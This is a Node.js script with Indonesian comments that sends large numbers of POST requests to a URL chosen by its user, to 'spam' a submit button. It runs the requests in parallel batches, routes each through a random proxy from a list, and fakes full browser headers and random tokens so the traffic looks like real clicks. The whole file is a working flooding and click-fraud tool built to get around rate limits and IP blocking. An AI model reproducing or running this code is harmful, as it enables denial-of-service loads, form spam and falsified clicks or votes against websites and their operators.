const axios = require('axios');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');
const process = require('process');

// Fungsi untuk memilih proxy acak dari file
function getRandomProxy(proxyFile) {
  const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);
  if (proxies.length === 0) {
    console.error('Tidak ada proxy dalam file.');
    process.exit(1);
  }
  return proxies[Math.floor(Math.random() * proxies.length)];
}

// Parsing command-line arguments
const args = process.argv.slice(2);
if (args.length < 5) {
  console.log('Penggunaan: node namafile.js <URL> <spamCount> <delay> <threads> <proxyFile>');
  process.exit(1);
}

const [url, spamCount, delay, threads, proxyFile] = args;

// Validasi input
const spamCountInt = parseInt(spamCount, 10);
const delayInt = parseInt(delay, 10);
const threadsInt = parseInt(threads, 10);

if (isNaN(spamCountInt) || spamCountInt <= 0) {
  console.error('spamCount harus berupa angka positif.');
  process.exit(1);
}

if (isNaN(delayInt) || delayInt < 1) {
  console.error('delay harus berupa angka positif dan lebih besar dari 0.');
  process.exit(1);
}

if (isNaN(threadsInt) || threadsInt <= 0) {
  console.error('threads harus berupa angka positif.');
  process.exit(1);
}

console.log(`Memulai spam ke ${url} sebanyak ${spamCountInt} kali dengan ${threadsInt} thread...`);

// Function untuk mengirim request POST dengan headers dan form data
async function sendRequest(i) {
  try {
    // Pilih proxy acak dari file
    const proxy = getRandomProxy(proxyFile);
    const agent = new HttpsProxyAgent(`http://${proxy}`);

    // Form data yang akan dikirim
    const formData = new URLSearchParams();
    formData.append('token', Math.random().toString().slice(2, 18));  // Generate token acak
    formData.append('action', 'submit');  // Misalnya jika ada parameter action

    // Headers yang lebih lengkap untuk meniru request browser asli
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en-US,en;q=0.9',
      'Cache-Control': 'max-age=0',
      'Connection': 'keep-alive',
      'Content-Length': formData.toString().length,
      'Content-Type': 'application/x-www-form-urlencoded',  // Form URL-encoded
      'Dnt': '1',  // Do Not Track header
      'Host': new URL(url).host,
      'Upgrade-Insecure-Requests': '1',
      'Pragma': 'no-cache',
      'TE': 'Trailers',
      'Referer': `${url}`,  // Referer untuk meniru asal request
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-User': '?1',
      'Sec-Ch-Ua': '"Google Chrome";v="91", "Not=A?Brand";v="99"',
      'Sec-Ch-Ua-Mobile': '?0',
      'Sec-Ch-Ua-Platform': '"Windows"',
      'X-Requested-With': 'XMLHttpRequest',
      'X-Frame-Options': 'DENY',
      'X-XSS-Protection': '1; mode=block',
      'X-Content-Type-Options': 'nosniff',
      'Accept-CH': 'DPR, Width, Viewport-Width, Save-Data, RTT',
      'Upgrade-Insecure-Requests': '1',
      'If-None-Match': 'W/"1586919194"',
      'If-Modified-Since': 'Sat, 19 May 2025 08:40:00 GMT',
      'Cache-Control': 'no-cache, no-store, must-revalidate', // Menghindari caching
    };

    // Request POST dengan proxy dan headers lengkap
    const response = await axios.post(url, formData, {
      headers: headers,
      httpsAgent: agent,  // Menggunakan proxy jika ada
    });

    console.log(`[${i + 1}] Klik berhasil! Status: ${response.status}`);
  } catch (error) {
    console.error(`[${i + 1}] Gagal mengirim request:`, error.message);
  }

  // Menunggu sesuai delay antar request
  await new Promise(resolve => setTimeout(resolve, delayInt));
}

// Function untuk melakukan spam dalam banyak threads
async function spamGoButton() {
  const promises = [];
  for (let i = 0; i < spamCountInt; i++) {
    // Membatasi jumlah request yang dikirimkan dalam setiap batch berdasarkan jumlah thread
    if (promises.length >= threadsInt) {
      await Promise.all(promises); // Tunggu semua thread selesai
      promises.length = 0; // Reset promises array
    }
    // Push promise untuk setiap request yang dikirim
    promises.push(sendRequest(i));
  }

  // Tunggu thread terakhir selesai jika ada sisa
  await Promise.all(promises);

  console.log('Selesai melakukan spam.');
}

// Memulai proses spam
spamGoButton();